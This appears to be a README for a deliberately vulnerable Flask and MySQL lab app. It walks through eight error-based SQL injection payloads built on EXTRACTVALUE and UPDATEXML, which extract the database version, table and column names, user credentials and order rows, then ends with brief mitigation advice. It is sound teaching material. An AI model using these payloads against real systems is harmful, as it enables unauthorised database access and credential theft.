
# Error SQL injection: Setup and Exploitation Guide

This project demonstrates how a SQL Injection vulnerability can be exploited in a Flask (Python) web application using Docker containers to simulate real-world scenarios. The report covers the setup of the environment, the process of exploitation, and key takeaways for securing web applications.
---

## Prerequisites

1. **Docker Installed**: Ensure Docker is installed on your system.
   - Check Docker version:
     
     docker --version
    

Install from docker.com if necessary.

2. **Basic Command Line Knowledge**: Ability to navigate and run commands in the terminal.

---

## Setting Up the Application
### Step 1: Clone the Repository
Clone this repository to your local machine:

```bash
git clone https://github.com/christina210490/Service_Web_Error_sqli.git
cd Service_Web_Error_sqli
 ```

### Step 2: Build and Run the Docker Containers
1. Build the Docker Environment:

```bash
docker-compose build
 ```

2. Run the Docker Containers:

```bash
docker-compose up -d
```
3. Access the Application: Open your browser and navigate to:

```bash
http://localhost:8081
```

4. Stop the Application: 

Press Ctrl+C in the terminal running docker-compose or stop it with:

```bash
docker-compose down
```

## Exploiting the SQL Injection Vulnerability


The web application was intentionally designed to have unsanitized user inputs, making it vulnerable to SQL injection attacks. Below are the detailed attack vectors executed:


# Attack 1: Retrieve MySQL Version

**Query:**
```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, @@version)) -- -
```
**Result:**

```bash
Result: SQL error: XPATH syntax error: ' 5.7.44'
```
**Explanation:**

This attack leverages the EXTRACTVALUE() function to extract an XML value, which intentionally fails and causes an SQL error revealing the MySQL version. By injecting the @@version variable into the query, we retrieve the version of the running MySQL server, which in this case is 5.7.44.
.................................

# Attack 2: Retrieve Database Name:

**Query:**
```bash
http://localhost:8081/user?id=1' AND UPDATEXML(1, CONCAT(0x0a, DATABASE()), 1) -- -
```
**Result:**

```bash
Result: SQL error: XPATH syntax error: ' testdb'
```
**Explanation:**

This attack uses the UPDATEXML() function, which triggers an error when incorrect XML is processed. By injecting the DATABASE() function into the query, we retrieve the name of the current database, which is revealed as testdb.
.................................

Attack 3: Retrieve the Number of Tables in the Database

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'testdb'))) -- -
```

**Result:**

```bash
Result: SQL error: XPATH syntax error: ' 3'
```

**Explanation:**

This attack queries the information_schema.tables table, which stores metadata about all tables in the database. By injecting a subquery to count the number of tables in the testdb schema, the SQL error reveals that there are 3 tables.

.................................

Attack 4: Retrieve Table Names

1. Retrieve all table names in one query:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'testdb'))) -- -
```

**Result:**

```bash
Result: SQL error: XPATH syntax error: ' orders,payments,users'
```

**Explanation:**

This attack uses the GROUP_CONCAT() function to concatenate all table names into a single string. The SQL error reveals the table names: orders, payments, users.

2. Retrieve table names one by one:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 0,1))) -- -
```

**Result:**

```bash
Result: SQL error: XPATH syntax error: ' orders'
```
**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 1,1))) -- -
```

**Result:**
```bash
Result: SQL error: XPATH syntax error: ' payments'
```

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'testdb' LIMIT 2,1))) -- -
```

**Result:**
```bash
Result: SQL error: XPATH syntax error: ' users'
```
.................................

Attack 5: Retrieve Column Information

1. Retrieve the number of columns in the users table:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'testdb'))) -- -
```
**Result:**

```bash
Result: SQL error: XPATH syntax error: ' 4'.
```

**Explanation:**
This attack queries the information_schema.columns table, which contains metadata about all columns in the database. By counting the columns within the users table, the SQL error reveals that the table has 4 columns. 

2. Retrieve column names:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'testdb' LIMIT 0,1))) -- -
```

**Result:**

```bash
Result: SQL error: XPATH syntax error: ' id'.
```

**Explanation:**

This attack queries the information_schema.columns table to retrieve metadata about columns. The SQL error reveals the column names of the users table, starting with id. Subsequent injections reveal additional columns such as name, email, password.

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'testdb' LIMIT 1,1))) -- -
```

**Result:**

```bash
SQL error: XPATH syntax error: ' name'
```

Repeat for other columns: email, password.
.................................

Attack 6: Retrieve User Data
Retrieve rows from the users table:

**Query:**
```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT CONCAT(id, ':', name, ':', email, ':', password) FROM users LIMIT 0,1))) -- -
```

**Result:**
```bash
Result: 1:Alice:alice@example.com:password1.
```

**Explanation:**

This attack concatenates columns from the users table into a single output using the CONCAT() function. The SQL error reveals the first row of user data: 1:Alice:alice@example.com:password1.

Repeat for other rows to retrieve all user data.
.................................

Attack 7: Extract All Passwords:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT GROUP_CONCAT(password SEPARATOR '') FROM users))) -- -
```

**Result:**

```bash
Result: password1password2password3.
```

**Explanation:**

This attack concatenates all passwords from the users table using the GROUP_CONCAT() function. The SQL error reveals the passwords stored in the database: password1, password2, password3.
.................................

Attack 8: Retrieve row by row of "orders" table:

**Query:**

```bash
http://localhost:8081/user?id=1' AND EXTRACTVALUE(1, CONCAT(0x0a, (SELECT CONCAT(order_id, ':', user_id, ':', product, ':', amount) FROM orders LIMIT 0,1))) -- -
```

**Result:**

```bash
Result: SQL error: XPATH syntax error: ' 1:1:Laptop:999.99'
```

**Explanation:**

This attack retrieves rows from the orders table by concatenating the columns into a single string using the CONCAT() function. The SQL error reveals the first row of the table: order_id: 1, user_id: 1, product: Laptop, amount: 999.99.
-----

# Impact

This application demonstrates the critical risks of SQL injection vulnerabilities, including:

1. Data Theft: Attackers can retrieve sensitive information like user credentials.

2. Database Manipulation: Malicious queries can delete, modify, or insert data.

3. System Exposure: Attackers can gain insights into system configurations.

---

# Mitigation

To prevent SQL injection:

1. Use Prepared Statements:

Avoid directly concatenating user inputs into SQL queries.
Use parameterized queries.

2.Input Validation:

Validate and sanitize all user inputs.
Reject unexpected or dangerous input patterns.

3. Least Privilege:

Restrict database permissions to limit the impact of an exploited vulnerability.

## Key Takeaways

- This app demonstrates the risks of unsanitized user inputs in SQL queries.
- Real-world attackers could exploit such vulnerabilities to steal sensitive data or manipulate the database.
- Always use prepared statements and validate user inputs to prevent SQL injection.

---

## Disclaimer: 

This guide is intended for educational purposes in a controlled environment. Unauthorized testing or exploitation is illegal and may lead to legal consequences.
